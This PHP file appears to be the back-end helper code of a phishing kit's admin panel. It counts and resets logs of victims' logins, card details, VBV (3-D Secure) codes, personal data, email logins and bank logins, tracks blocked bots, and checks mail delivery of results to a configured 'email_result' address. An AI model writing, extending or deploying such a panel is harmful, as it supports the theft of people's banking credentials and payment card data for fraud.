<?php
function get_method($method,$callback,$key = null)
{
    $key = ($key == null ) ? 'rp' : $key;

    if($_GET[''.$key.''] == $method)
    {
        return $callback();
    }else{
        return false;
    }
}

/** init **/

/** get statistic files */
function get_statistic()
{
    if(is_dir(PUBLIC_PATH.'/logs/'))
    {
        $scan = scandir(PUBLIC_PATH.'/logs/');
        foreach($scan as $log)
        {
            if(!preg_match("/log/",$log))continue;

            $data[] = $log;
        }
    }else{

        $data = ['no data available .log'];
    }

    return $data;
}

/** get configurations */
function get_config()
{
    if(file_exists(XAPP_PATH .'/config/config.json'))
    {
        return json_decode(file_get_contents(XAPP_PATH.'/config/config.json'), true);
    }else{

        return false;
    }
}

function pconfig($main,$sub)
{

    return PCONFIG[''.$main.''][''.$sub.''];
}

function save_config($data = [])
{
    

    $json = json_encode($data,JSON_PRETTY_PRINT);

    return file_put_contents(XAPP_PATH.'/config/config.json' , $json);
}

function reset_stats()
{

    
        if(is_dir(PUBLIC_PATH.'/logs/'))
        {
            $scan = scandir(PUBLIC_PATH.'/logs/');
            foreach($scan as $log)
            {
                if(!preg_match("/log/",$log))continue;
    
                @unlink(PUBLIC_PATH.'/logs/'.$log);
            }
        }
    
}

function shortnumber($num) {

    if($num>1000) {
  
          $x = round($num);
          $x_number_format = number_format($x);
          $x_array = explode(',', $x_number_format);
          $x_parts = array('K', 'M', 'B', 'T');
          $x_count_parts = count($x_array) - 1;
          $x_display = $x;
          $x_display = $x_array[0] . ((int) $x_array[1][0] !== 0 ? '.' . $x_array[1][0] : '');
          $x_display .= $x_parts[$x_count_parts - 1];
  
          return $x_display;
  
    }
  
    return $num;
  }
function count_stats($filename)
    {
      $dir = PUBLIC_PATH.'/logs/'.$filename.'.log';
      if(file_exists($dir)){
      $c = explode("\n",file_get_contents($dir));
      $c = count($c)-1;
      }else{
        $c=0;
      }
      return shortnumber($c);
    }

function home_api()
{
    $data['visitor'] = count_stats('visitor');
    $data['bot'] = count_stats('block');
    $data['login'] = count_stats('login');
    $data['card'] = count_stats('card');
    $data['vbv'] = count_stats('card-vbv');
    $data['pap'] = count_stats('pap');
    $data['email'] = count_stats('email_login');
    $data['bank'] = count_stats('bank');
    $data['access'] = count_stats('access');
    return $data;
}

function getApp()
{
    if(file_exists(XAPP_PATH . '/config/web.php')){
        require XAPP_PATH . '/config/web.php';
        return $config['web']['app_name'].' - '.$config['web']['version'];
    }else{
        return 'App name - @version ';
    }
}

function get_php_ver(){
    $minimal = '7.2';
    $phpv = phpversion();
    if($phpv < $minimal)
    {
        return "$phpv - <small><font color=red>( Recommended <b>PHP v{$minimal}</b> )</font></small>";
    }else{
        return "$phpv - <font color=green>OK</font>";
    }
}

function mail_support(){
    $config = get_config();

    if(function_exists('mail'))
    {
        return "<font color=green> OK </font> <small><a href='?rp=test_send' class='hover:underline text-blue-900'>Test send to : ".@$config['email_result']." </a></small>";
    }else{
        return "<font color=red>NOT SUPPORTED </font>!";
    }
}
function htaccess_apache(){
    if(preg_match("/apache/" , $_SERVER['SERVER_SOFTWARE'])){

    $get = apache_get_modules();
    if(in_array('mod_rewrite' , $get))
    {
        return "<font color=green> OK </font>";
    }else{
        return "<font color=red>Mod_rewrite not enabled.</font>";
    }
    
    }else{
        return "<font color=orange>Webserver not apache</font> ";
    }
}